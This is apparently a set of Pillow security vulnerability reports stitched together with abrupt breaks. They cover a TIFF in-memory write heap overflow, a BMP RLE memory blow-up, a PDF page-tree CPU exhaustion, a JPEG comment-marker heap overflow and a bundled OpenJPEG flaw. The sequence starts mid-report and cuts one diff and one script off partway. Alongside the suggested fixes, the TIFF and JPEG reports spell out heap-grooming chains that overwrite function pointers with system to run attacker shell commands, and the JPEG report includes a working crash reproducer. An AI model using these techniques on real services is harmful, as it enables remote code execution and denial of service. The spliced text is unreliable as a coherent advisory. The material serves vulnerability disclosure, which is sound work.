The general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.  The disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.  The defect was introduced in e782fe721e01 ("initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support", 2013-03-08), first released in Pillow 2.0.0.  ## Impact  Any service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).  Given two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), "TIFF")` per upload executed an attacker-chosen shell command (`id>/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`&system`, `&PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif->tif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system("id>/tmp/r.…") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.  Independently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.  ## Reproducing  `repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.  **Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open("upload.tif").save(<target>, "TIFF")` with no options, once with `"out.tif"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.  **Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression="tiff_lzw"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.  Expected output on this tree:  ``` upload.tif: 131198 bytes save to file path : exit code 0, out.tif = 131210 bytes save to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size' -> heap overflow crashed the process: True  same image, same options, saved to a file path vs. to a BytesIO:   offset 369177: file 0x00   BytesIO 0x55   offset 369417: file 0x00   BytesIO 0x55   offset 369423: file 0x00   BytesIO 0x55   offset 369451: file 0x00   BytesIO 0x55  -> BytesIO output contains never-written heap bytes: True  BUG ```  The last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.  ## Suggested fix  The attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc > size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:  ```diff -        while (newsize < (size + state->size)) { +        while (newsize < (size + (tsize_t)state->loc)) {  … +        memset((UINT8 *)new_data + state->size, 0, newsize - state->size);          state->data = new_data;          state->size = newsize;          to_write = size; +    } else if (to_write < 0) { +        TIFFError("_tiffWriteProc", "Invalid Write at loc %" PRIu64 ", size: %" PRIu64, …); +        return 0;      } ```  `_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.  ## The patch  Size the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc  Applies to `src/libImaging/TiffDecode.c` at the commit above.  ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..d2a926a62 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):          save_bytesio("packbits")          save_bytesio("tiff_lzw")   +    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -> None: +        # When writing the directory, libtiff seeks past the end of the data +        # written so far, and then writes the tag values there. ## Summary BmpRleDecoder can be forced to allocate gigabytes of memory from a kilobyte-sized crafted BMP file via unbounded growth in the delta escape and absolute mode branches.  ## Affected versions All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)  ## Root cause BmpRleDecoder.decode() (BmpImagePlugin.py:327-395) builds a Python bytearray `data` with dest_length = xsize*ysize, looping `while len(data) < dest_length`. The loop condition is only checked at the TOP; individual branches append attacker-controlled amounts UNBOUNDED by dest_length:  - delta escape (line 370): data += b"\x00" * (right + up * self.state.xsize) with right,up in 0..255 -> up to ~255*xsize bytes in ONE iteration. - absolute mode (line 385): data += bytes_read (up to 255).  Because a single delta can push len(data) to ~256 * (row size), a tiny RLE stream combined with a large-but-legal xsize (xsize*ysize just under MAX_IMAGE_PIXELS, ~89M) yields a multi-GB `data` bytearray (then copied again by bytes(data) and set_as_raw). No heap OOB (bytearray/set_as_raw are bounds-safe), but a severe memory-amplification DoS: the attacker file stays tiny.  ## Reproduction Python 3.13, Pillow HEAD e7a7ea84  Attached: pillow_poc_bmp_rle_dos.py  A 1084-byte BMP (BI_RLE8, width=3,000,000, height=1 -> 3M px, passes bomb check) with one delta escape (00 02 00 150) produces ~429 MB `data`; measured peak RSS 911 MB. Scaling width toward the bomb limit and up=255 produces tens of GB from a ~1 KB file.  ## Suggested fix Cap growth at dest_length in the delta and absolute branches, e.g. clamp the delta fill to (dest_length - len(data)) and stop appending once len(data) >= dest_length; reject deltas that would move the cursor beyond the image, matching the existing per-row clamp at line 341-343.  Credit: Yazan Balawneh - CyStack Security Team (GitHub: sonicnew)  [pillow_poc_bmp_rle_dos.py](https://github.com/user-attachments/files/30244974/pillow_poc_bmp_rle_dos.py)

### Summary Pillow's documented PDF append path can spend disproportionate CPU time on a compact malformed PDF page tree.  An attacker who can supply an existing PDF to an application that appends an image with `Image.save(..., format="PDF", append=True)` can provide a malformed `/Pages` tree where each level repeats the same child `/Pages` reference in `/Kids`. Pillow treats the graph as a tree and expands each repeated reference in `PdfParser.linearize_page_tree()` without tracking visited or duplicate indirect references.  In the bounded proof below, a `1410`-byte PDF expands to `8192` page references from one distinct page object and takes about `9.6` seconds through the append path. A comparable linear control with the same depth stays at one page reference and completes in about `0.02` seconds.  This is in scope for Pillow's security policy because it is reproducible in `main`, affects the latest public release tested (`12.3.0`), and is not just an unexpected Python exception. The vulnerable operation accepts attacker-controlled PDF bytes through Pillow's PDF parser and causes deterministic resource consumption before normal completion.  ### Details  #### Affected versions  - Package: `Pillow` - Ecosystem: `pip` / PyPI - Affected component: `src/PIL/PdfParser.py` page-tree traversal reached from `src/PIL/PdfImagePlugin.py` PDF append handling - Runtime-tested affected release: `12.3.0` - Runtime-tested affected development version: `13.0.0.dev0` - Tested commit: `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Current source artifact hash: `sha256(git archive --format=tar HEAD) = 2ccefca23d432456765be8d3c34564c65ba016b0c9da1e44ca389762f7eda054` - Release `12.3.0` commit: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d` - Release `12.3.0` source artifact hash: `sha256(git archive --format=tar 12.3.0) = 94bed33fd20123938dbc0153d295250bb4e3c09251b6d4a34f7595e25d409c81` - Source-level affected: `5.1.0`, `12.2.0`, `12.3.0`, and `HEAD` - Likely affected range: `>= 5.1.0` - Patched versions: none known  Evidence fact strings:  - Runtime-tested affected: 12.3.0 - Runtime-tested affected: 13.0.0.dev0 at b39b9649312fbc381060e8c7c7f9f0de4cc63daa - Source-level affected: 5.1.0 - Source-level affected: 12.2.0 - Source-level affected: HEAD - Likely affected range: >= 5.1.0, no fixed version known - Pre-boundary note: 5.0.0 has PdfImagePlugin.py but no src/PIL/PdfParser.py  `5.0.0` contains `src/PIL/PdfImagePlugin.py` but does not contain `src/PIL/PdfParser.py`. `PdfParser.py` was introduced by `6207b44ab1ff4a91d8ddc7579619876d0bb191a4` (`2018-01-18 issue #2959: support appending to existing PDFs`), which shipped in `5.1.0`.  #### Technical details  The reachable path is:  1. A service or application receives an attacker-influenced existing PDF and appends an image using Pillow's public PDF save path:     ```python    Image.new("L", (1, 1), 0).save(existing_pdf_file, format="PDF", append=True)    ```  2. `src/PIL/PdfImagePlugin.py` routes `append=True` to `PdfParser`:     ```python    is_appending = im.encoderinfo.get("append", False)    filename_str = filename.decode() if isinstance(filename, bytes) else filename    if is_appending:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="r+b")    else:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="w+b")    ```  3. `src/PIL/PdfParser.py` parses the existing PDF and linearizes the page tree:     ```python    self.page_tree_root = self.read_indirect(self.pages_ref)    self.pages = self.linearize_page_tree(self.page_tree_root)    self.orig_pages = self.pages[:]    ```  4. `linearize_page_tree()` recursively follows every `/Kids` entry and extends the page list. It does not track page-tree node identity, duplicate references, or active traversal references:     ```python    def linearize_page_tree(        self, node: PdfDict | None = None    ) -> list[IndirectReference]:        page_node = node if node is not None else self.page_tree_root        check_format_condition(            page_node[b"Type"] == b"Pages", "/Type of page tree node is not /Pages"        )        pages = []        for kid in page_node[b"Kids"]:            kid_object = self.read_indirect(kid)            if kid_object[b"Type"] == b"Page":                pages.append(kid)            else:                pages.extend(self.linearize_page_tree(node=kid_object))        return pages    ```  5. During append, `rewrite_pages()` then iterates the expanded `orig_pages` list and scans/replaces entries in `self.pages`, adding more cost to the already expanded duplicate-reference list.  The missing invariant is:  ```text The PDF page tree should be treated as an acyclic tree of unique indirect references before Pillow builds pages/orig_pages or rewrites pages. ```  The proof intentionally uses a malformed PDF page-tree DAG: each `/Pages` node repeats the same next `/Pages` child reference twice. Pillow accepts this graph and expands it as if the repeated reference represented distinct subtrees.  ### PoC  Environment used for validation:  - OS/runtime: Linux, Python `3.13.11` - Current tested build: Pillow `13.0.0.dev0`, commit `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Latest release tested: Pillow `12.3.0` - The proof uses only synthetic in-memory PDFs and does not contact the network. Applications are impacted if untrusted users can supply an existing PDF that the application later appends to, watermarks, or exports using Pillow's `Image.save(..., format="PDF", append=True)` route. ``` ============================================================================ Heap buffer overflow writing JPEG comment after ICC profile fills buffer Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.  The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.  Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., "JPEG", icc_profile=im.info.get("icc_profile"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.  The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.  The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.  ## Details  `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.  A JPEG laid out as  ``` FFD8                                   SOI FFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"] FFFE <len> <comment, any length 1..65533>           -> im.info["comment"] <any baseline RGB JPEG body> ```  opened with `Image.open()` and re-saved with the usual colour-profile-preserving call  ```python im.save(out, "JPEG", icc_profile=im.info.get("icc_profile")) ```  kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.  ### Code path  The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:  ```python # src/PIL/JpegImagePlugin.py:859-862     else:         # The EXIF info needs to be written as one block, + APP1, + one spare byte.         # Ensure that our buffer is big enough. Same with the icc_profile block.         bufsize = max(len(exif) + 5, len(extra) + 1) ```  `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).  The "+1 spare byte" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(&cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:  ```c // src/libImaging/JpegEncode.c:302-337         case 3:             if (context->extra) {                 unsigned int n = context->extra_size - context->extra_offset;                 if (n > context->destination.pub.free_in_buffer) {                     n = context->destination.pub.free_in_buffer;                 }                 memcpy(context->destination.pub.next_output_byte, context->extra + context->extra_offset, n);                 context->destination.pub.next_output_byte += n;                 context->destination.pub.free_in_buffer -= n;                 context->extra_offset += n;                 if (context->extra_offset >= context->extra_size) {                     state->state++;                 // done -> fall into case 4, even with free_in_buffer == 0                 } else {                     break;                 }             } …          case 4:             if (context->comment) {                 jpeg_write_marker(&context->cinfo, JPEG_COM,                                   (unsigned char *)context->comment, context->comment_size);   // :330 — no space check             }             state->state++;          case 5:             if (1024 > context->destination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64                 break;             }             … jpeg_write_scanlines(…) … ```  Every other emitting state is guarded — state 2 requires `rawExifLen + 5 <= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.  With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is  ```c /* jcmarker.c */   *(dest->next_output_byte)++ = (JOCTET)val;   if (--dest->free_in_buffer == 0) { if (!(*dest->empty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); } ```  i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(&buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.  All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info["icc_profile"]` (`:238-241`) and stores the COM payload in `im.info["comment"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get("comment", im.info.get("comment"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info["icc_profile"]` and a `tEXt` chunk keyed `comment` becomes `im.info["comment"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert("RGB") → save("JPEG", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `"Created with GIMP"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.  ### What lies behind the buffer  The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo->main->process_data`) read from bytes the file supplied.  ## Impact  Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get("icc_profile")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.  It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context->comment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). Fixing it reduces those leaks to disclosures rather than footholds.  ## Reproducing  `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.  The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.  Each file goes through the same application code in a child `python3 -X faulthandler` process:  ```python im = Image.open(BytesIO(data)) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) ```  1. **Control.** The file has the ICC profile but no COM segment. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.  Expected output: the control prints `save returned normally` and `-> exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-> exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. RESAVE = """ import sys from io import BytesIO from PIL import Image im = Image.open(BytesIO(sys.stdin.buffer.read())) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) print("save returned normally") """   def segment(marker, payload):     return bytes([0xFF, marker]) + struct.pack(">H", len(payload) + 2) + payload   def make_jpeg(with_comment):     """A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM."""     noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data     out = BytesIO()     Image.frombytes("RGB", (256, 256), noise).save(out, "JPEG", quality=95)     plain = out.getvalue()      icc = segment(0xE2, b"ICC_PROFILE\0\x01\x01" + b"I" * ICC_PAYLOAD)     com = segment(0xFE, COMMENT) if with_comment else b""     return plain[:2] + icc + com + plain[2:]  # splice in right after SOI   def resave(jpeg):     # -X faulthandler: on a fatal signal, print where in Python the child died     cmd = [sys.executable, "-X", "faulthandler", "-c", RESAVE]     r = subprocess.run(cmd, input=jpeg, capture_output=True)     print((r.stdout + r.stderr).decode(errors="replace").strip())     print(f"-> exit status {r.returncode}")     return r.returncode   # Control: the same file without a COM segment re-saves fine, so the buffer # sizing and the ICC profile on their own are harmless. print("Control: re-save the JPEG without a comment") resave(make_jpeg(with_comment=False))  # The bug: add a COM segment. The comment is now written into a buffer that has # no room left. print(f"\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment") rc = resave(make_jpeg(with_comment=True))  # A negative return code means the child was killed by a signal (SIGSEGV or # SIGABRT from glibc's heap checks), not by a Python exception. if rc < 0:     print(f"\nim.save() killed the process with signal {-rc}: out-of-bounds heap write")     print("BUG") else:     print("OK") ``` </details>  ---

### Summary  Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219  Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.  I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.  Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.  ### Details  ## Affected wheels  From `.github/dependencies.json` (`openjpeg`) at each tag:  | Pillow | bundled OpenJPEG | status | |---|---|---| | 10.4.0 | 2.5.2 | safe | | 11.0.0 | 2.5.2 | safe | | **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** | | **12.0.0 … 12.3.0** | **2.5.4** | **affected** |  Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins 